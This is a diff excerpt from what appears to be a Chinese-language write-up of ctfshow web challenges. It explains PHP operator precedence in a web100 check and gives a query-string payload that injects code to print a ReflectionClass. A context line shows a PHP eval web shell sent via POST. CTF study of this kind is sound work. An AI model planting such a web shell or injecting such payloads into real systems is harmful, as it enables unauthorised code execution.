@@ -88,3 +88,14 @@ get:n=1.php  POST: content=<?php eval($_POST[a]); ?>
 
 >**web100** 
 ![100](/assets/images/10000.png)   
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);   
+重点理解这句话，这句话是关键   
+首先我们应该补给一下知识   
+优先权 && > = > and   
+|| > = > or  
+因此这句话只用满足v1为数字即可   
+第二部分     
+反射类的具体使用方法可参考php官网文档,简单来说反射类就是存放了类里的所有东西。     
+最简单的方法直接输出这个类即可，也就是构造出 echo new ReflectionClass('ctfshow');     
+payload:?v1=1&v2=echo new ReflectionClass&v3=;  
+
